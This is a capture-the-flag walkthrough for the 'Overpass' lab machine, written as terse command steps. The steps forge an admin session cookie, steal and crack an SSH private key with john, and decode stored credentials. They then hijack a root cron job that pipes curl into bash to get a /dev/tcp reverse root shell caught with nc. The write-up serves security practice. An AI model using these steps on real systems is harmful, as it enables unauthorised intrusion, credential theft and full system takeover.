# Overpass

- Hack the machine and get the flag in user.txt

	- `nmap -sV -p- <TARGET_IP>`
	- `scilla dir -target <TARGET_IP>`, [scilla](https://github.com/edoardottt/scilla)
	- There is a `/admin/` page and a `cookie.js` file...... ahahaha
	- Inspect a bit the code, in particular `cookie.js` and `login.js`.
	- Create a cookie called `sessionToken` with value `admin`.
	- Refresh the `/admin/` page.
	- Copy the RSA private key into a file called `id_rsa`.
	- Move this file into `~/.ssh`.
	- `chmod 700 ~/.ssh/id_rsa`
	- `ssh james@<TARGET_IP>`
	- Noo. We need the passphrase.
	- `/usr/share/john/ssh2john.py ~/.ssh/id_rsa > key.txt`
	- `john key.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	- `*******`
	- Try with ssh and insert password.
	- `cat user.txt`
	- `thm{********************************}`

- Escalate your privileges and get the flag in root.txt

	- `cat todo.txt`. Mhh...
	- `cat .overpass`
	- Copy that code.
	- Insert into CyberChef with recipe `ROT47`.
	- `[{"name":"******","pass":"********************"}]`
	- But these are just the credentials of james...
	- `cat /etc/crontab`
	~~~
	# Update builds from latest code
	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`
	~~~
	- Mhhh...
	- Edit `/etc/hosts` file inserting `<YOUR_IP>	overpass.thm` and deleting the previous one.
	- On your machine create `/downloads/src/buidscript.sh` and write into it `bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1;`
	- On your machine `python3 -m http.server 80`
	- On your machine `nc -lnvp 1234`
	- After a while that cronjob will be executed and you get a reverse root shell.
	- `cat root.txt`
	- `thm{********************************}`




